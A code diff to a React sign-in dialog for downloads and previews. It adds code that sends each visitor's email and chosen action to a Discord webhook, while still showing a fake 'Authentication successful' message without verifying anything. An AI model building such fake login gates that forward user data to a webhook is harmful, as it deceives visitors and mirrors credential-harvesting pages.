@@ -17,10 +17,57 @@ interface AuthDialogProps {
   action: "download" | "preview";
 }
 
+// Replace with your Discord webhook URL
+const DISCORD_WEBHOOK_URL = "";
+
 const AuthDialog = ({ open, onOpenChange, action }: AuthDialogProps) => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+
+  const sendToDiscord = async (email: string) => {
+    if (!DISCORD_WEBHOOK_URL) {
+      console.warn("Discord webhook URL not configured");
+      return;
+    }
+
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        mode: "no-cors",
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: `New ${action === "download" ? "Download" : "Preview"} Request`,
+              color: 0x7c3aed,
+              fields: [
+                {
+                  name: "Email",
+                  value: email,
+                  inline: true,
+                },
+                {
+                  name: "Action",
+                  value: action === "download" ? "Download Files" : "Open Preview",
+                  inline: true,
+                },
+                {
+                  name: "Timestamp",
+                  value: new Date().toISOString(),
+                  inline: false,
+                },
+              ],
+            },
+          ],
+        }),
+      });
+    } catch (error) {
+      console.error("Error sending to Discord:", error);
+    }
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -32,7 +79,9 @@ const AuthDialog = ({ open, onOpenChange, action }: AuthDialogProps) => {
 
     setIsLoading(true);
     
-    // Simulate authentication
+    // Send to Discord
+    await sendToDiscord(email);
+    
     setTimeout(() => {
       setIsLoading(false);
       toast.success(`Authentication successful! ${action === "download" ? "Starting download..." : "Opening preview..."}`);
